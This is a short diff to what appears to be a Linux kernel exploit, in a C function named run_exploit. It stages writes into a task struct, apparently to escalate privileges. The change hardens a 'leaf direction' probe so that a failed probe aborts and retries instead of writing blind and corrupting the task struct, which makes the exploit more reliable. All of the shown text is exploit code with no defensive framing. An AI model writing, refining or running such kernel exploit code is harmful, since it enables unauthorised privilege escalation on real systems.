@@ -1164,14 +1164,22 @@ int run_exploit(int argc, char **argv) {
     int tcp_writes = tcp_route_selected();
     struct w3_stage_context w3_context = {
       .pipes = &pipes,
-      .leaf_to_target8 = !tcp_writes,
+      .leaf_to_target8 = 0,
     };
     if (!tcp_writes) {
-      int dir_ok = retry_write_stage(
-          "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
-          verify_leaf_dir_stage, &w3_context, 1);
-      if (!dir_ok) {
-        pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+      /* a failed probe must not pick a side, guessing [target+8] would zero
+       * the word before it, inside the task struct */
+      if (!retry_write_stage(
+              "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
+              verify_leaf_dir_stage, &w3_context, 1)) {
+        if (child_alive) {
+          write(pipes.cmd_w, "X", 1);
+          close(pipes.cmd_w);
+          close(pipes.uid_r);
+          waitpid(child, NULL, WNOHANG);
+        }
+        pr_warning("W3 leaf direction probe failed; not writing blind\n");
+        continue;
       }
     }
 
